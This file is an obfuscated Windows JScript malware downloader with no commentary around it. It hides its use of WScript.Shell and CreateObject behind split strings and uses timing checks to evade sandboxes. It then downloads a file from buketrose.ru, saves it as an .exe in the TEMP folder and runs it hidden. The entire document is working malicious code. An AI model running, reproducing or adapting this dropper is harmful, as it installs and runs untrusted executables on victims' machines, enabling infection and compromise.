var R0 = false;
var M0 = "Create"+"Object";
var UN = function HQ0() {return WScript[M0]("WScript"+".Shell");}(), CA = 11;
var M2 = "MSXML2"+".XMLHTTP";
var NV = 2;
var V = NV - 2;
function A(X){UN["Run"](X, V, V);};
function D(){return M2 + "";};
function L(I, DH){V = V * 1; return I - DH;};
function HE(){return M0;};
/*@cc_on
  @if (@_win32 || @_win64)
    R0 = true;
  @end
@*/
if (R0)
{
var Q = "";
function M(){return 22;};
var AQ = 0; var QS = 0;
function S()
{
var EM = new this["Date"]();
var DO = EM["getUTCMilliseconds"]();
WScript["Sleep"](M());
var EM = new this["Date"]();
var T = EM["getUTCMilliseconds"]();
WScript["Sleep"](M());
var EM = new this["Date"]();
var L0 = EM["getUTCMilliseconds"]();
var AQ = "G";
AQ = L(T, DO);
var QS = "B";
QS = L(L0, T);
Q = "open";
return L(AQ, QS);
}
var M3 = false;
var Y = false;
for (var K = V; K < M() * 1; K++){if (S() != V){
M3 = true; 
QS = "31" + 11 * AQ + QS; 
Y = true; 
break;
}}
function OU() {return ((M3 == true) && (M3 == Y)) ? 1 : V;};
if (M3 && OU() && Y){
function LW() {return UN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KZEBvczV.ex" + "e";};
 KT = D();
 XW = WScript[M0](KT);
 var XG = 1;
do { 
	for (;XG;){
	try {
		if (XG == 1)
		{
			XW[Q]("GET", "http://buketrose.ru/h3sia", false);
			XW["send"]();
			R = "Sleep";
			XG = 2;
		}
		WScript[R](M() + 120); 
		if (XW["readystate"] < 2 * 2) continue;
		XG = V;
		function HQ(OV) {var M1 = (1, 2, 3, 4, 5, OV); return M1;};
		X0 = WScript[HE()]("ADODB.Stream");
		KT = X0;
		KT[Q]();
		KT["type"] = HQ(1);
		KT["write"](XW["ResponseBody"]);
		X0["position"] = HQ(V);
		KT["Save" + "ToFile"](LW(), 2);
		X0["cl"+"ose"]();
		UE = LW();
		A(UE);
	} catch(A0){};};
}while (XG);
}
}

